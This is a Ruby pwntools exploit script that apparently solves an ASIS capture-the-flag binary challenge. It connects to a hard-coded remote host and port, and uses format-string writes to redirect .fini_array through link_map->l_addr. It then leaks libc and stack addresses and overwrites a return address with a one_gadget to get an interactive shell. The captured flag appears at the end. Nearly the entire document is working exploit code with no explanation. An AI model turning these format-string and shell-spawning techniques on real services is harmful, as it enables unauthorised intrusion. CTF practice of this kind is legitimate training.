#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

@magic = one_gadget(file: './libc.so.6')[4]

def host; ARGV.empty? ? '127.0.0.1' : '146.185.168.172'; end
def port; 54515; end
$z = Sock.new host, port
def z;$z;end
@p = ''
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.arch = 'amd64' 
# context.log_level = :debug

def pt; z.recvuntil("Now let's move to 2010\n"); end
def dump_each
  1.step(50) do |i|
    $z = Sock.new host, port
    pt
    z.puts("%#{i}$p|||")
    log.info(i.to_s + ': ' + z.recvuntil('|||')[0..-4])
    z.close
  end
end

# dump_each

def fmt(need, index, width: 2)
  @cur ||= 0
  mod = 256 ** width
  this = need % mod - @cur % mod 
  this += mod if this <= 0
  @cur += this
  "%#{this}c%#{index}$#{'h' * (2 / width)}n"
end

buf = 0x601800
fini_array = 0x600e10
start = 0x4005f0
payload = ''
payload << fmt(start & 0xffff, 16)
payload << fmt(start >> 16, 17)
payload << fmt(buf - fini_array, 40) # modify link_map->l_addr
payload << '@@%2$p|||%20$p@@'
fail if payload.size > 64
payload = payload.ljust(64, 'A')
payload << p64(buf) + p64(buf+2) # 16, 17
z.puts payload

z.recvuntil('@@')
libc, stack = z.recvuntil('@@').split('|||').map { |v| v.to_i(16) }
libc -= 0x3c6790
stack -= 0x2b8
log.info("libc @ #{libc.hex}")
log.info("stack @ #{stack.hex}")

# change return address to one_gadget
target = libc + @magic
payload = ''
@cur = 0
target.p64.bytes[0, 3].each_with_index do |v, i|
  payload << fmt(v, 16 + i, width: 1)
end
fail if payload.size > 64
payload = payload.ljust(64, 'A')
payload << 3.times.map { |i| p64(stack + i) }.join
fail if payload =~ /[ \n\x09\x0b\x0c\x0d]/
z.puts payload
z.interact

# ASIS{There_is_a_road_What_w3_Ca11_1t_D0ng_Fang}
